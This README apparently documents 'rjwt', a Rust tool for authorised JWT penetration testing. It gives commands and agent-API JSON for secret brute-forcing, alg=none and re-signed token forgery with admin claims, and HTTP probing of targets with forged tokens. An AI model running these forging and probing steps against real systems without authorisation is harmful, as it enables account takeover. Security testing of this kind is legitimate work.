# rjwt - JWT Security Analysis Tool

> ⚠️ **声明：本工具仅用于授权渗透测试、CTF竞赛和安全研究。请勿对未授权目标使用。**

用 Rust 编写的 JWT 安全分析工具，支持结构解析、弱密钥爆破、漏洞检测、Token 伪造以及 RESTful Agent API。

---

## 功能模块

| 模块 | 功能 |
|------|------|
| `analyzer` | JWT三段式解析、时间验证、完整信息展示 |
| `vulnerabilities` | alg=none、算法混淆、kid注入、jku SSRF等漏洞检测 |
| `bruteforce` | 并行字典爆破（内置弱密钥 + 自定义字典 + 动态扩展） |
| `dictionary` | 弱密钥字典生成器（内置词、年份组合、Leet变体等） |
| `http_client` | 携带JWT向目标站点发送HTTP请求、响应中提取JWT |
| `api` | 完整RESTful API（供AI Agent或自动化工具调用） |

---

## 构建

```bash
# 需要 Rust 1.70+ (推荐 stable)
cargo build --release

# 二进制位于
./target/release/rjwt
```
> 当然,编译结束后也可以将工具的二进制程序文件单独拎出来用.
---

## CLI 使用示例

### 1. 解析JWT结构

```bash
./rjwt parse eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxxxx

# JSON输出（适合管道处理）
./rjwt parse <token> --json
```

### 2. 安全分析（漏洞检测 + 风险评级）

```bash
./rjwt analyze eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.

# 输出示例：
# 综合风险等级: 🔴 严重 (CRITICAL)
# [严重] JWT-001 - Algorithm None 攻击
#    利用提示: 将header中alg改为none，去掉签名段...
```

### 3. 弱密钥爆破

```bash
# 使用内置字典（含400+弱密钥+动态扩展）
./rjwt brute <token>

# 使用自定义字典文件
./rjwt brute <token> -w /path/to/wordlist.txt

# 组合使用
./rjwt brute <token> -w wordlist.txt --builtin true
```

### 4. 伪造Token

```bash
# alg=none 攻击（生成4种大小写变体）
./rjwt forge <token> --alg none

# 用已知密钥重签（修改claims）
./rjwt forge <token> -s "secret" --payload '{"sub":"admin","role":"administrator"}'

# 算法切换 HS256→HS512
./rjwt forge <token> -s "mykey" --alg HS512
```

### 5. HTTP探测（与目标站点通信）

```bash
# 默认 Authorization: Bearer 注入
./rjwt probe https://api.example.com/profile -t <token>

# 自定义header注入
./rjwt probe https://api.example.com/data -t <token> --placement "header:X-Auth-Token"

# Cookie注入
./rjwt probe https://api.example.com/ -t <token> --placement "cookie:session"

# Query参数注入
./rjwt probe https://api.example.com/api -t <token> --placement "query:jwt"
```

### 6. 启动 Agent API 服务

```bash
# 默认 127.0.0.1:7878
./rjwt serve

# 自定义地址（这个是Vibe Coding时顺便写的，我都没想到有什么用）
./rjwt serve --host 0.0.0.0 -p 9999
```

---

## Agent API 接口文档

服务启动后，所有功能均可通过 HTTP API 调用。

### 健康检查

```
GET /health
```

### 独立接口

```
POST /api/parse          # 解析JWT
POST /api/analyze        # 安全分析
POST /api/bruteforce     # 弱密钥爆破
POST /api/vulns          # 漏洞检测
POST /api/forge          # Token伪造
POST /api/probe          # HTTP探测
```

### 统一Agent接口（推荐）

```
POST /api/agent
```

所有操作通过 `action.type` 字段路由，适合 AI Agent 调用。

#### 示例：解析JWT

```json
POST /api/agent
{
  "action": {
    "type": "parse",
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.xxxx"
  }
}
```

#### 示例：弱密钥爆破

```json
POST /api/agent
{
  "action": {
    "type": "bruteforce",
    "token": "<jwt>",
    "use_builtin": true,
    "wordlist": ["myapp", "company2024", "prod-secret"]
  }
}
```

#### 示例：Token伪造

```json
POST /api/agent
{
  "action": {
    "type": "forge",
    "original_token": "<jwt>",
    "new_claims": {"sub": "admin", "role": "superuser", "exp": 9999999999},
    "secret": "found_secret",
    "alg": "HS256"
  }
}
```

#### 示例：HTTP探测

```json
POST /api/agent
{
  "action": {
    "type": "http_probe",
    "request": {
      "url": "https://target.example.com/api/me",
      "method": "GET",
      "headers": {"Accept": "application/json"},
      "body": null,
      "jwt_placement": "AuthorizationBearer",
      "jwt_token": "<forged_jwt>"
    }
  }
}
```

#### 统一响应格式

```json
{
  "success": true,
  "action": "bruteforce",
  "data": {
    "success": true,
    "found_secret": "secret123",
    "attempts": 847,
    "duration_ms": 12
  },
  "error": null
}
```

---

## 检测的漏洞类型

| ID | 漏洞 | 严重度 |
|----|------|--------|
| JWT-001 | Algorithm None 攻击 | 严重 |
| JWT-002 | 对称算法弱密钥风险 | 中危 |
| JWT-003 | 算法混淆攻击 (RS256→HS256) | 高危 |
| JWT-004 | kid 路径遍历注入 | 高危 |
| JWT-005 | kid SQL 注入 | 严重 |
| JWT-006 | jku SSRF / 外部密钥注入 | 高危 |
| JWT-007 | x5u SSRF / 外部证书注入 | 高危 |
| JWT-008 | 缺少过期时间 (exp) | 中危 |
| JWT-009 | nbf 时间检测 | 低危 |
| JWT-010 | Token 长期未刷新 | 低危 |

---

## 项目结构

```
rjwt/
├── Cargo.toml
└── src/
    ├── lib.rs           # 模块导出
    ├── main.rs          # CLI入口 (clap)
    ├── models.rs        # 数据结构定义
    ├── analyzer.rs      # JWT解析 + 安全分析
    ├── bruteforce.rs    # 弱密钥爆破 + Token伪造
    ├── dictionary.rs    # 字典生成器
    ├── vulnerabilities.rs  # 漏洞利用模块
    ├── http_client.rs   # HTTP通信模块
    └── api.rs           # Axum REST API服务
```

---

## 声明

开源协议为MIT License - 且仅用于合法授权的安全研究用途.
